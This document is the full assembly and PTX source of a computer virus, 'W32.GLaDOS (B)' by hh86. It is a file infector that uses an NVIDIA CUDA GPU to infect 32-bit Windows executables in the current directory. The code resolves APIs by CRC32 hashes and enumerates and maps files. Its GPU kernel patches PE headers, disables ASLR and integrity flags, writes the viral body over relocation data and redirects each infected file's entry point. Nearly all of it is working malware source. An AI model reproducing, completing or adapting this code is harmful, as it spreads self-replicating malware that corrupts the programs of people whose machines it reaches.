comment °
W32.GLaDOS (B) by hh86
- direct action file infector of PE32 exe files on current directory
- overwrites reloc data in last section
- infects files using the CUDA GPU
- CRC32 instead of API names for smaller code
- PTX source is preprocessed for size optimisation
°

.386
.model  flat, stdcall
include glados.inc

.data
gladosasm                db     "glados.asm", 0
iformat                  db     "%i", 0

.code
assume fs:nothing

link_text       proc     near
        call    text_end

text_begin      label    near
        db      49h, 20h, 63h, 68h
        db      72h, 69h, 73h, 74h
        db      65h, 6eh, 20h, 79h
        db      6fh, 75h, 72h, 20h
        db      66h, 72h, 69h, 67h
        db      68h, 74h, 65h, 6eh
        db      69h, 6eh, 67h, 20h
        db      66h, 6ch, 69h, 67h
        db      68h, 74h, 3ah, 0ah
        db      0dh, 59h, 6fh, 75h
        db      6eh, 67h, 20h, 65h
        db      61h, 67h, 6ch, 65h
        db      2ch, 20h, 72h, 69h
        db      73h, 65h, 20h, 69h
        db      6eh, 20h, 74h, 68h
        db      65h, 20h, 61h, 69h
        db      72h, 21h, 0ah, 0dh
        db      59h, 6fh, 75h, 20h
        db      73h, 74h, 61h, 72h
        db      65h, 64h, 20h, 61h
        db      74h, 20h, 74h, 68h
        db      65h, 20h, 73h, 75h
        db      6eh, 21h, 20h, 2dh
        db      20h, 6dh, 79h, 20h
        db      6ch, 69h, 67h, 68h
        db      74h, 0ah, 0dh, 41h
        db      6eh, 64h, 20h, 64h
        db      65h, 6ch, 69h, 63h
        db      61h, 74h, 65h, 20h
        db      67h, 61h, 7ah, 65h
        db      20h, 63h, 61h, 6eh
        db      27h, 74h, 20h, 63h
        db      6fh, 6dh, 70h, 61h
        db      72h, 65h, 2eh, 0ah
        db      0dh, 0ah, 0dh, 49h
        db      20h, 73h, 74h, 6fh
        db      6fh, 64h, 2ch, 20h
        db      6dh, 6fh, 72h, 65h
        db      20h, 74h, 65h, 6eh
        db      64h, 65h, 72h, 20h
        db      74h, 68h, 61h, 6eh
        db      20h, 74h, 68h, 6fh
        db      73h, 65h, 0ah, 0dh
        db      57h, 68h, 6fh, 27h
        db      76h, 65h, 20h, 77h
        db      69h, 74h, 6eh, 65h
        db      73h, 73h, 65h, 64h
        db      20h, 79h, 6fh, 75h
        db      20h, 64h, 69h, 73h
        db      61h, 70h, 70h, 65h
        db      61h, 72h, 2eh, 2eh
        db      2eh, 0ah, 0dh, 49h
        db      27h, 6dh, 20h, 6bh
        db      69h, 73h, 73h, 69h
        db      6eh, 67h, 20h, 79h
        db      6fh, 75h, 20h, 6eh
        db      6fh, 77h, 20h, 2dh
        db      20h, 61h, 63h, 72h
        db      6fh, 73h, 73h, 0ah
        db      0dh, 54h, 68h, 65h
        db      20h, 67h, 61h, 70h
        db      20h, 6fh, 66h, 20h
        db      61h, 20h, 74h, 68h
        db      6fh, 75h, 73h, 61h
        db      6eh, 64h, 20h, 79h
        db      65h, 61h, 72h, 73h
        db      2eh, 0ah, 0dh
        db      "Marina Tsvetaeva (1916)"

text_end        label    near
        pop     ecx
        xor     ebx, ebx
        push    500h
        push    ebx
        push    ebx
        push    offset text_end - offset text_begin
        push    ecx
        push    -0bh                         ;STD_OUTPUT_HANDLE
        call    WriteFile
        call    Sleep
        call    ExitProcess
link_text       endp

init_glados     label    near
        push    ebx
        xor     ebx, ebx
        push    ebx
        push    ebx
        push    3
        push    ebx
        push    ebx
        push    1
        push    offset gladosasm
        call    CreateFile 
        xchg    eax, edi
        push    ebx
        push    edi
        call    GetFileSize  
        xchg    ebp, eax
        push    ebp
        push    ebx                          ;GMEM_FIXED
        call    GlobalAlloc
        xchg    esi, eax 
        push    ebx
        push    esp
        push    ebp
        push    esi
        push    edi
        call    ReadFile
        push    edi
        call    CloseHandle
        push    esi
        mov     ecx, ebp

find_ptx        label    near
        cmp     dword ptr [esi], "rev."
        je      parse_code
        inc     esi
        loop    find_ptx

exit_ctor       label    near
        push    0
        call    ExitProcess 

parse_code      label    near
        mov     edi, offset vesper_ptx
        lea     eax, dword ptr [ebp + (offset vesper_ptx - offset glados_exe) + 100]
        push    ecx
        push    PAGE_EXECUTE_READWRITE
        push    MEM_COMMIT
        push    eax
        push    ebx
        call    VirtualAlloc 
        mov     edi, eax
        push    esi
        mov     esi, offset glados_exe
        mov     ecx, offset vesper_ptx - offset glados_exe
        rep     movs byte ptr [edi], byte ptr [esi]
        pop     esi
        pop     ecx
        push    edi
        push    eax

parse_line      label    near
        cmp     byte ptr [esi], "/"
        je      skip_line
        cmp     byte ptr [esi], " "
        je      copy_space
        cmp     word ptr [esi], 0a0dh
        je      skip_crlf
        movs    byte ptr [edi], byte ptr [esi]

branch_mloop    label    near
        loop    parse_line
        jmp     parse_done

skip_crlf       label    near
        inc     esi
        inc     esi
        dec     ecx
        jmp     branch_mloop

copy_space      label    near
        movs    byte ptr [edi], byte ptr [esi]
        jmp     branch_sloop

skip_spaces     label    near
        cmp     byte ptr [esi], " "
        jne     parse_line
        inc     esi
        
branch_sloop    label    near
        loop    skip_spaces
        jmp     parse_done

skip_line       label    near
        cmp     byte ptr [esi], 0dh
        je      parse_line
        inc     esi
        loop    skip_line

parse_done      label    near 
        pop     ebp
        pop     esi
        call    GlobalFree
        mov     dword ptr [edi], ebx
        sub     edi, ebp
        mov     ecx, edi
        mov     dword ptr [ebp + (offset codesize_patch1 - offset glados_exe) + 1], edi
        mov     dword ptr [ebp + (offset codesize_patch2 - offset glados_exe) + 1], edi

find_mpatch     label    near
        cmp     dword ptr [esi], "6891"
        je      patch_fullsize
        inc     esi
        loop    find_mpatch
        push    0
        call    ExitProcess 

patch_fullsize  label    near
        push    edi
        push    offset iformat    
        push    esi
        call    wsprintf
        add     esp, 0ch
        mov     byte ptr [esi + eax], ";"
        pop     ebx
        push    offset link_text
        add     ebp, offset init_seh - offset glados_exe
        jmp     ebp

;-------------------------------------------------------------------------------
;here begins in infected files
;-------------------------------------------------------------------------------

glados_exe      label    near
        push    dword ptr [ebx + PROCESS_ENVIRONMENT_BLOCK.dwImageBaseAddress]
        add     dword ptr [esp], "hh86"
        pushad
        call    init_seh
        pop     eax
        pop     eax
        pop     esp
        xor     eax, eax
        pop     dword ptr fs:[eax]
        pop     eax
        popad
        ret

init_seh        label    near
        xor     edx, edx
        push    dword ptr fs:[edx]
        mov     dword ptr fs:[edx], esp
        mov     eax, dword ptr [ebx + PROCESS_ENVIRONMENT_BLOCK.lpLoaderData]
        mov     esi, dword ptr [eax + _PEB_LDR_DATA.dwInLoadOrderModuleList.FLink]
        lods    dword ptr [esi]
        xchg    esi, eax
        lods    dword ptr [esi]
        mov     ebp, dword ptr [eax + 18h]
        call    walk_dll
        dd      0b09315f4h                   ;CloseHandle
        dd      040cf273dh                   ;CreateFileMappingW
        dd      0a1efe929h                   ;CreateFileW
        dd      0d82bf69ah                   ;FindClose
        dd      03d3f609fh                   ;FindFirstFileW
        dd      081f39c19h                   ;FindNextFileW
        dd      0c97c1fffh                   ;GetProcAddress
        dd      03fc1bd8dh                   ;LoadLibraryA
        dd      0a89b382fh                   ;MapViewOfFile
        dd      0e1bf2253h                   ;SetFileAttributesW
        dd      0391ab6afh                   ;UnmapViewOfFile
        db      0

;-------------------------------------------------------------------------------
;initialize CUDA Driver API
;-------------------------------------------------------------------------------

skip_drop       label    near
        call    init_nvcuda

nvcuda          label    near
        db      "nvcuda", 0

kernel_name     label    near
        db      "h", 0

nvcuda_tbcrc    label    near
        dd      09beb7583h                   ;cuCtxCreate
        dd      0228042e0h                   ;cuCtxDestroy
        dd      01cd9f7cch                   ;cuCtxSynchronize
        dd      02054524bh                   ;cuDeviceComputeCapability
        dd      0a0d165edh                   ;cuDeviceGetAttribute
        dd      0a6b58b8bh                   ;cuDeviceGetCount
        dd      02fb978a3h                   ;cuDriverGetVersion
        dd      0499227beh                   ;cuInit
        dd      0abaf2025h                   ;cuLaunchKernel
        dd      0df62b5e9h                   ;cuMemAlloc
        dd      0b748be7dh                   ;cuMemFree
        dd      00560139ch                   ;cuMemcpyDtoH
        dd      04600e00fh                   ;cuMemcpyHtoD
        dd      0762d7398h                   ;cuModuleGetFunction
        dd      0df58bd96h                   ;cuModuleLoadDataEx
        dd      0a9cd570dh                   ;cuModuleUnload
        db      0

init_cudrv      label    near
        push    ecx
        mov     edi, esp

;-------------------------------------------------------------------------------
;get available number of CUDA capable devices
;-------------------------------------------------------------------------------

        push    ecx
        call    dword ptr [edi + 4 + nvcudadrv.cuInit]
        test    eax, eax
        jnz     branch_exit
        xchg    ebx, eax
        push    ebx
        push    esp
        call    dword ptr [edi + 4 + nvcudadrv.cuDeviceGetCount]
        test    eax, eax
        jnz     branch_exit
        pop     ebp
        dec     ebp                         ;always decrease because 0 is also a valid device ID
        js      branch_exit                 ;but 0 means not one ;)

;-------------------------------------------------------------------------------
;current CUDA driver must be version 5.0
;-------------------------------------------------------------------------------

        push    ebx
        push    esp
        call    dword ptr [edi + 4 + nvcudadrv.cuDriverGetVersion]
        test    eax, eax
        jnz     branch_exit
        pop     eax
        cmp     eax, CUDA_DRIVER_VERSION
        jne     branch_exit

test_device     label    near

;-------------------------------------------------------------------------------
;compute capability of the device must be 3.x
;-------------------------------------------------------------------------------

        push    ebx
        mov     edx, esp
        push    ebx
        mov     ecx, esp
        push    ebp
        push    edx
        push    ecx
        call    dword ptr [edi + 4 + nvcudadrv.cuDeviceComputeCapability]
        test    eax, eax
        jnz     branch_ndev
        pop     eax
        pop     ecx
        cmp     eax, 3
        jne     branch_ndev

;-------------------------------------------------------------------------------
;compute mode must be CU_COMPUTEMODE_DEFAULT so that we can use it
;CU_COMPUTEMODE_EXCLUSIVE and CU_COMPUTEMODE_EXCLUSIVE_PROCESS may work too
;-------------------------------------------------------------------------------

        push    ebx
        mov     ecx, esp
        push    ebp
        push    CU_DEVICE_ATTRIBUTE_COMPUTE_MODE
        push    ecx
        call    dword ptr [edi + 4 + nvcudadrv.cuDeviceGetAttribute]
        test    eax, eax
        pop     eax
        jnz     branch_ndev
        test    eax, eax
        jz      create_context

branch_ndev     label    near
        dec     ebp
        jns     test_device

branch_exit     label    near
        int     3

;-------------------------------------------------------------------------------
;create CUDA context in this device, load module and copy virus code into device memory
;-------------------------------------------------------------------------------

create_context  label    near
        push    ebp
        push    CU_CTX_SCHED_BLOCKING_SYNC
        push    edi
        call    dword ptr [edi + 4 + nvcudadrv.cuCtxCreate]
        test    eax, eax
        jnz     branch_ndev
        lea     eax, dword ptr [esi + (offset vesper_ptx - offset init_cudrv)]
        push    ebx
        mov     ecx, esp
        push    ebx
        push    ebx
        push    ebx
        push    eax
        push    ecx
        call    dword ptr [edi + 4 + nvcudadrv.cuModuleLoadDataEx]
        test    eax, eax
        pop     ecx
        jnz     context_destroy
        push    ecx
        lea     eax, dword ptr [esi - (offset init_cudrv - offset kernel_name)]
        push    ebx
        mov     edx, esp
        push    eax
        push    ecx
        push    edx
        call    dword ptr [edi + 4 + nvcudadrv.cuModuleGetFunction]
        test    eax, eax
        pop     ebp
        jnz     module_unload
        push    ebx
        mov     edx, esp

codesize_patch1 label    near
        push    "hh86"        
        push    edx
        call    dword ptr [edi + 4 + nvcudadrv.cuMemAlloc]
        test    eax, eax
        pop     eax
        jnz     module_unload
        push    eax
        mov     dword ptr [esi + (offset devmem_patch - offset init_cudrv) + 1], eax
        sub     esi, offset init_cudrv - offset glados_exe
        
codesize_patch2 label    near
        push    "hh86"
        push    esi
        push    eax
        call    dword ptr [edi + 4 + nvcudadrv.cuMemcpyHtoD]
        test    eax, eax
        jnz     device_memfree
        push    edi
        call    init_ffseh    
        pop     eax
        pop     eax
        pop     esp
        xor     eax, eax
        pop     dword ptr fs:[eax]
        pop     eax
        pop     edi

device_memfree  label    near
        call    dword ptr [edi + 4 + nvcudadrv.cuMemFree]

module_unload   label    near
        call    dword ptr [edi + 4 + nvcudadrv.cuModuleUnload]

context_destroy label    near
        push    dword ptr [edi]
        call    dword ptr [edi + 4 + nvcudadrv.cuCtxDestroy]
        int     3

;-------------------------------------------------------------------------------
;find files in current directory
;-------------------------------------------------------------------------------

init_ffseh      label    near
        push    dword ptr fs:[ebx]
        mov     dword ptr fs:[ebx], esp
        sub     esp, sizeof WIN32_FIND_DATA
        push    "*"
        mov     esi, esp
        push    esp
        push    esi
        call    dword ptr [edi + 4 + sizeof nvcudadrv + kernel32.kFindFirstFileW]

map_object      label    near
        cmp     dword ptr [esi + WIN32_FIND_DATA.nFileSizeLow], ebx
        je      skip_object
        push    eax
        push    dword ptr [esi + WIN32_FIND_DATA.dwFileAttributes]
        lea     ecx, dword ptr [esi + WIN32_FIND_DATA.cFileName]
        push    ecx
        push    ebx
        push    ebx
        push    OPEN_EXISTING
        push    ebx
        push    ebx
        push    3                            ;GENERIC_READ | GENERIC_WRITE
        push    ecx
        push    FILE_ATTRIBUTE_ARCHIVE
        push    ecx
        call    dword ptr [edi + 4 + sizeof nvcudadrv + kernel32.kSetFileAttributesW]
        call    dword ptr [edi + 4 + sizeof nvcudadrv + kernel32.kCreateFileW]
        push    eax
        push    ebx
        push    ebx
        push    ebx
        push    PAGE_READWRITE
        push    ebx
        push    eax
        call    dword ptr [edi + 4 + sizeof nvcudadrv + kernel32.kCreateFileMappingW]
        push    eax
        push    ebx
        push    ebx
        push    ebx
        push    FILE_MAP_WRITE
        push    eax
        call    dword ptr [edi + 4 + sizeof nvcudadrv + kernel32.kMapViewOfFile]
        push    eax
        push    eax
        mov     eax, dword ptr [esi + WIN32_FIND_DATA.nFileSizeLow]
        push    4
        pop     ecx
        dec     ecx
        add     eax, ecx
        not     ecx
        and     eax, ecx
        push    ebx
        mov     edx, esp
        push    eax
        push    edx
        call    dword ptr [edi + 4 + nvcudadrv.cuMemAlloc]
        test    eax, eax
        pop     eax
        pop     ecx
        jnz     unmap_view
        pushad
        call    launch_vesper
        pop     eax
        pop     eax
        pop     esp
        xor     eax, eax
        pop     dword ptr fs:[eax]
        pop     eax
        popad
        push    eax
        call    dword ptr [edi + 4 + nvcudadrv.cuMemFree]

unmap_view      label    near
        call    dword ptr [edi + 4 + sizeof nvcudadrv + kernel32.kUnmapViewOfFile]
        call    dword ptr [edi + 4 + sizeof nvcudadrv + kernel32.kCloseHandle]
        call    dword ptr [edi + 4 + sizeof nvcudadrv + kernel32.kCloseHandle]
        call    dword ptr [edi + 4 + sizeof nvcudadrv + kernel32.kSetFileAttributesW]
        pop     eax

skip_object     label    near
        push    eax
        push    esi
        push    eax
        call    dword ptr [edi + 4 + sizeof nvcudadrv + kernel32.kFindNextFileW]
        test    eax, eax
        pop     eax
        jnz     map_object
        push    eax
        call    dword ptr [edi + 4 + sizeof nvcudadrv + kernel32.kFindClose]
        int     3                            ;but it was a trick and the clock struck twelve

;-------------------------------------------------------------------------------
;copy map view into device memory, and launch file infector
;-------------------------------------------------------------------------------

launch_vesper   proc    near
        push    dword ptr fs:[ebx]
        mov     dword ptr fs:[ebx], esp
        push    dword ptr [esi + WIN32_FIND_DATA.nFileSizeLow]
                                             ;cuMemcpyDtoH
        push    eax                          ;cuMemcpyDtoH
        push    ecx                          ;cuMemcpyDtoH
        push    eax
        push    dword ptr [esi + WIN32_FIND_DATA.nFileSizeLow]
        push    ecx
        push    eax
        call    dword ptr [edi + 4 + nvcudadrv.cuMemcpyHtoD]
        test    eax, eax
        jnz     launch_break
        inc     eax
        mov     edx, esp

devmem_patch    label    near
        push    "hh86"
        push    esp
        push    edx
        mov     ecx, esp       
        push    ebx
        push    ecx
        push    ebx
        push    ebx
        push    eax
        push    eax
        push    eax
        push    eax
        push    eax
        push    eax
        push    ebp
        call    dword ptr [edi + 4 + nvcudadrv.cuLaunchKernel]
        call    dword ptr [edi + 4 + nvcudadrv.cuCtxSynchronize]
        pop     eax
        pop     eax
        pop     eax
        pop     eax
        call    dword ptr [edi + 4 + nvcudadrv.cuMemcpyDtoH]

launch_break    label    near
        int     3
launch_vesper   endp
   
;-------------------------------------------------------------------------------
;load CUDA Driver DLL
;-------------------------------------------------------------------------------

init_nvcuda     label    near
        call    dword ptr [esp + 4 + kernel32.kLoadLibraryA]
        add     esi, 5 + (offset nvcuda_tbcrc - offset nvcuda)
        xchg    ebp, eax
        push    esi

;-------------------------------------------------------------------------------
;DLL walker
;-------------------------------------------------------------------------------

walk_dll        label    near
        pop     esi
        mov     ebx, ebp
        mov     eax, dword ptr [ebp + IMAGE_DOS_HEADER.e_lfanew]
        add     ebx, dword ptr [ebp + eax + IMAGE_DOS_HEADER.e_lfanew shl 1]
        cdq

walk_names      label    near
        mov     eax, ebp
        mov     edi, ebp
        inc     edx
        add     eax, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY.AddressOfNames]
        add     edi, dword ptr [eax + edx * 4]
        or      eax, -1

crc32_l1        label    near
        xor     al, byte ptr [edi]
        push    8
        pop     ecx

crc32_l2        label    near
        shr     eax, 1
        jnc     crc32_l3
        xor     eax, 0edb88320h

crc32_l3        label    near
        loop    crc32_l2
        inc     edi
        cmp     byte ptr [edi], cl
        jne     crc32_l1
        not     eax
        cmp     dword ptr [esi], eax
        jne     walk_names
        mov     edi, ebp
        mov     eax, ebp
        add     edi, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals]
        movzx   edi, word ptr [edi + edx * 2]
        add     eax, dword ptr [ebx + IMAGE_EXPORT_DIRECTORY.AddressOfFunctions]
        mov     eax, dword ptr [eax + edi * 4]
        add     eax, ebp
        push    eax
        lods    dword ptr [esi]
        sub     cl, byte ptr [esi]
        jnz     walk_names
        inc     esi
        jmp     esi

;-------------------------------------------------------------------------------
;here begins PTX source code
;-------------------------------------------------------------------------------

vesper_ptx      label    near
        db      "suddenly she was no longer there with me although I'm there with her."

end     init_glados

//-------------------------------------------------------------------------------
//here begins PTX source code
//-------------------------------------------------------------------------------

.version 3.0
.target sm_30

//-------------------------------------------------------------------------------
//functions to read 32/16-bit fields
//-------------------------------------------------------------------------------

.func (.reg .b32 r) d(.reg .b32 m, .reg .b32 o){
        .reg .b32 a, b;

        add.s32           m, m, o;
        ld.global.b8      b, [m + 3];
        shl.b32           a, b, 24;
        ld.global.b8      b, [m + 2];
        shl.b32           b, b, 16;
        add.s32           a, a, b;
        ld.global.b8      b, [m + 1];
        shl.b32           b, b, 8;
        add.s32           a, a, b;
        ld.global.b8      b, [m];
        add.s32           r, a, b;
        ret;
}

.func (.reg .b32 r) w(.reg .b32 m, .reg .b32 o) {
        .reg .b32 a, b;

        add.s32           m, m, o;
        ld.global.b8      b, [m + 1];
        shl.b32           a, b, 8;
        ld.global.b8      b, [m];
        add.s32           r, a, b;
        ret;
}

.func sd(.reg .b32 m, .reg .b32 o, .reg .b32 v) {
        add.s32           m, m, o;
        st.global.b8      [m], v;
        shr.b32           v, v, 8;
        st.global.b8      [m + 1], v;
        shr.b32           v, v, 8;
        st.global.b8      [m + 2], v;
        shr.b32           v, v, 8;
        st.global.b8      [m + 3], v;
        ret;
}

.func sw(.reg .b32 m, .reg .b32 o, .reg .b32 v) {
        add.s32           m, m, o;
        st.global.b8      [m], v;
        shr.b32           v, v, 8;
        st.global.b8      [m + 1], v;
        ret;
}

//-------------------------------------------------------------------------------
//parse file struct
//signatures must match those of PE exe files
//-------------------------------------------------------------------------------

.entry h(.param .b32 m, .param .b32 v) {
        .reg .b32 r<12>;
        .reg .pred p;

        ld.param.b32      r2, [m];
        ld.global.b16     r3, [r2];
        mov.s32           r6, 1986;        //replace with offset glados_end - offset glados_exe
        setp.eq.b32       p, r3, 0x5a4d;
@!p     exit;
        ld.global.b32     r3, [r2 + 0x3c];
        mov.b32           r1, r2;
        add.u32           r2, r2, r3;
        call              (r3), d, (r2, 0);
        setp.eq.b32       p, r3, 0x4550;
@!p     exit;

//-------------------------------------------------------------------------------
//32-bit machine
//discard DLL files (because they do not have own PEB) and system files
//do not test IMAGE_FILE_32BIT_MACHINE because it is ignored by Windows even for PE32+
//-------------------------------------------------------------------------------

        call              (r3), w, (r2, 4);
        setp.eq.b32       p, r3, 0x14c;      //IMAGE_FILE_MACHINE_I386
@!p     exit;
        call              (r3), w, (r2, 0x16);
        and.b32           r4, r3, 2;
        setp.eq.b32       p, r4, 2;          //IMAGE_FILE_EXECUTABLE_IMAGE
@!p     exit;
        and.b32           r4, r3, 0x2000;
        setp.eq.b32       p, r4, 0x2000;     //IMAGE_FILE_DLL
@p      exit;
        and.b32           r4, r3, 0x1000;
        setp.eq.b32       p, r4, 0x1000;     //IMAGE_FILE_SYSTEM
@p      exit;

//-------------------------------------------------------------------------------
//IMAGE_NT_OPTIONAL_HDR_MAGIC must match PE32 structure (not ROM, not 64-bit) configuration
//-------------------------------------------------------------------------------

        call              (r3), w, (r2, 0x18);
        setp.eq.b32       p, r3, 0x10b;      //IMAGE_NT_OPTIONAL_HDR32_MAGIC
@!p     exit;

//-------------------------------------------------------------------------------
//SizeOfOptionalHeader must indicate that it covers at least until reloc fields entries
//-------------------------------------------------------------------------------

        call              (r5), w, (r2, 0x14);
        setp.ge.s32       p, r5, 0x90;       //(IMAGE_DIRECTORY_ENTRY_RELOC_TABLE - IMAGE_NT_HEADERS.OptionalHeader.Magic) + 8
@!p     exit;
        setp.ge.s32       p, r5, 0xb8;       //(IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG_TABLE - IMAGE_NT_HEADERS.OptionalHeader.Magic) + 8
@!p     bra               skip_ldcchk;
        call              (r3), d, (r2, 0xc8);
        setp.eq.s32       p, r3, 0;
@!p     exit;

//-------------------------------------------------------------------------------
//Windows CUI/GUI subsystem
//-------------------------------------------------------------------------------

skip_ldcchk:
        call              (r3), w, (r2, 0x5c);
        setp.eq.b32       p, r3, 2;
@p      bra               test_relocs;
        setp.eq.b32       p, r3, 3;
@!p     exit; 

//-------------------------------------------------------------------------------
//relocs must be physically/virtually located whithin the last section
//-------------------------------------------------------------------------------

test_relocs:
        call              (r4), w, (r2, 6);
        sub.s32           r4, r4, 1;
        mul.lo.s32        r4, r4, 0x28;      //store low half from 64-bit result
        add.s32           r4, r4, r5;
        add.s32           r4, r4, r2;
        add.s32           r4, r4, 0x18;
        call              (r3), d, (r4, 0xc);
        call              (r5), d, (r2, 0xa0);
        setp.lt.s32       p, r5, r3;
@p      exit;
        call              (r7), d, (r2, 0xa4);
        setp.lt.s32       p, r7, r6;
@p      exit;
        add.s32           r8, r7, r5;
        call              (r9), d, (r2, 0x50);
        setp.lt.s32       p, r9, r8;
@p      exit;
        call              (r7), d, (r4, 0x14);
        mov.s32           r10, r5;
        sub.s32           r5, r5, r3;
        add.s32           r1, r1, r5;
        add.s32           r1, r1, r7;
        add.s32           r5, r5, r7;
        call              (r3), d, (r4, 0x14);
        setp.lt.s32       p, r3, r5;
@p      exit;

//-------------------------------------------------------------------------------
//clear *_NO_SEH to enable SEH, and *_FORCE_INTEGRITY to infect files signed files
//clear *_DYNAMIC_BASE to disable ASLR
//-------------------------------------------------------------------------------

        call              (r3), w, (r2, 0x5e);
        and.b32           r3, r3, 0xfb3f;    //not (IMAGE_DLLCHARACTERISTICS_NO_SEH or IMAGE_DLLCHARACTERISTICS_FORCE_INTEGRITY or IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE)
        call              sw, (r2, 0x5e, r3);

//-------------------------------------------------------------------------------
//clear base relocations data directory entries
//-------------------------------------------------------------------------------

        ld.global.b8      r3, [r2 + 0x16];
        or.b32            r3, r3, 1;         //IMAGE_FILE_RELOCS_STRIPPED
        st.global.b8      [r2 + 0x16], r3;
        call              sd, (r2, 0xa0, 0);
        call              sd, (r2, 0xa4, 0);

//-------------------------------------------------------------------------------
//copy code to section
//-------------------------------------------------------------------------------

        ld.param.b32      r7, [v];
        mov.s32           r5, r1;

copy_code:
        ld.global.b8      r3, [r7];
        st.global.b8      [r1], r3;
        add.s32           r1, r1, 1;
        add.s32           r7, r7, 1;
        sub.s32           r6, r6, 1;
        setp.eq.u32       p, r6, 0;
@!p     bra               copy_code;

//-------------------------------------------------------------------------------
//if the code fits physically, then we make sure it fits virtually too
//-------------------------------------------------------------------------------

        call              (r3), d, (r4, 8);
        add.s32           r3, r3, 0x1000;
        call              sd, (r4, 8, r3);
        call              (r3), d, (r2, 0x50);
        add.s32           r3, r3, 0x1000;
        call              sd, (r2, 0x50, r3);

//-------------------------------------------------------------------------------
//clear *_NX_COMPAT above, then might not need IMAGE_SCN_MEM_EXECUTE in section flags
//-------------------------------------------------------------------------------

        ld.global.b8      r3, [r4 + 0x24 + 3];
        or.b32            r3, r3, 0xa0;
        st.global.b8      [r4 + 0x24 + 3], r3;

//-------------------------------------------------------------------------------
//alter entrypoint
//-------------------------------------------------------------------------------

        call              (r3), d, (r2, 0x28);
        call              sd, (r2, 0x28, r10);
        call              sd, (r5, 6, r3);
        exit;     
}